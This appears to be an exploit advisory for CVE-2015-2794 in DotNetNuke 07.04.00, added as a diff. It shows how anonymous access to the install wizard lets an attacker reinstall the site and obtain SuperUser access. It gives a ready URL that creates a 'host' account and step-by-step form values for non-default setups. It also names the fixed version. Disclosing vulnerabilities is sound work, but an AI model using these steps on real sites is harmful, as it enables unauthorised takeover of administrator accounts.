@@ -1,0 +1,61 @@
+# Exploit Title: DotNetNuke 07.04.00 Administration Authentication Bypass
+# Date: 06-05-2016
+# Exploit Author: Marios Nicolaides
+# Vendor Homepage: http://www.dnnsoftware.com/
+# Software Link: https://dotnetnuke.codeplex.com/releases/view/611324
+# Version: 07.04.00
+# Tested on: Microsoft Windows 7 Professional (64-bit)
+# Contact: marios.nicolaides@outlook.com
+# CVE: CVE-2015-2794
+# Category: webapps
+ 
+1. Description
+   
+DotNetNuke 07.04.00 does not prevent anonymous users from accessing the installation wizard, as a result a remote attacker 
+can 'reinstall' DNN and get unauthorised access as a SuperUser.
+
+Previous versions of DotNetNuke may also be affected.
+ 
+   
+2. Proof of Concept
+ 
+The exploit can be demonstrated as follows:
+
+If the DNN SQL database is in the default location and configuration:
+	- Database Type: SQL Server Express File
+	- Server Name: .\SQLExpress
+	- Filename: Database.mdf (This is the default database file of DNN. You can find it at \App_Data\Database.mdf)
+
+The following URL will create an account with the username: 'host', password: 'dnnhost':
+	http://www.example.com/Install/InstallWizard.aspx?__VIEWSTATE=&culture=en-US&executeinstall
+
+
+If the DNN SQL database is not in the default configuration then the attacker must know its configuration or be able to brute-force guess it.
+
+	A. Visit http://www.example.com/Install/InstallWizard.aspx?__VIEWSTATE=
+	B. Fill in the form and submit it:
+		Username: whatever
+		Password: whateverpassword
+		Email address: whatever@example.com (You will get an error msg due to client-side validation, just ignore it)
+		Website Name: Whatever Site Name
+		Database Setup Custom:
+			- Database Type: SQL Server Express File
+			- Server Name: .\SQLExpress 
+				- This is the SQL Server instance name that we need to find or brute-force guess it in order to complete the installation. 
+				- If MSSQL database is accessible you can use auxiliary/scanner/mssql/mssql_ping from MSF to get it.
+			- Filename: Database.mdf
+				- This is the default database file of DNN. You can find it at "\App_Data\Database.mdf".
+			- Tick the box Run Database as a Database Owner
+	C. You will probably get an error. Remove the "__VIEWSTATE=" parameter from the URL and press enter.
+	D. When the installation completes click Visit Website.
+	E. Login with your credentials.
+
+3. Solution:
+
+Update to version 07.04.01
+https://dotnetnuke.codeplex.com/releases/view/615317
+
+4. References:
+
+http://www.dnnsoftware.com/platform/manage/security-center (See 2015-05 (Critical) unauthorized users may create new host accounts)
+http://www.dnnsoftware.com/community-blog/cid/155198/workaround-for-potential-security-issue
